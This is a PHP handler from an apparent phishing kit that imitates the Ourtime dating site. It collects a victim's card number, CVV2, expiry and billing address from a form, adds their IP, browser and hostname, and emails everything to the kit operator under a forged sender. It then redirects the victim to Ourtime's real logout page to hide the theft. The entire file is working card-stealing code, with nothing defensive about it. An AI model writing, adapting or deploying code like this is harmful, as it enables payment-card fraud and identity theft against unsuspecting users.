<?php

include('./blocker.php');
include('./block.php');
$ip = getenv("REMOTE_ADDR");  
$hostname = gethostbyaddr($ip);
$name = $_POST['name'];
$cc1 = $_POST['cc1'];
$cc2 = $_POST['cc2'];
$expm = $_POST['expm'];
$expy = $_POST['expy'];
$s1 = $_POST['s1'];
$s2 = $_POST['s2'];
$s3 = $_POST['s3'];
$country = $_POST['country'];
$state = $_POST['state'];
$s4 = $_POST['s4'];
$message ="
•••••••••••••••© Ourtime Cards 4 Vairus O. Family ©•••••••••••••••
Holder Name: ".$name."
Card Number: ".$cc1."
CVV2: ".$cc2."
Expiration: ".$expm."/".$expy."
Address: ".$s1.", ".$s2."
City: ".$s3."
Country: ".$country."
State: ".$state."
Zip: ".$s4."
••••••••••••••••••••••••••© Desk Info ©•••••••••••••••••••••••••••
IP: http://www.ip-score.com/checkip/".$ip."
Browser: ".$_SERVER['HTTP_USER_AGENT']."
Host: ".$hostname."
••••••••••••••••••••••^^^Happy E-Whoring^^^•••••••••••••••••••••••"; 

include('./mailer.php');
$subject = "Ourtime Cards (".$ip.")"; 
$headers = "From:  Vairus O.<updates@ourtimewhorers.com>"; 
mail($send,$subject,$message,$headers); 

$header = "http://www.ourtime.com/v3/logout";

header("Location: $header");

?>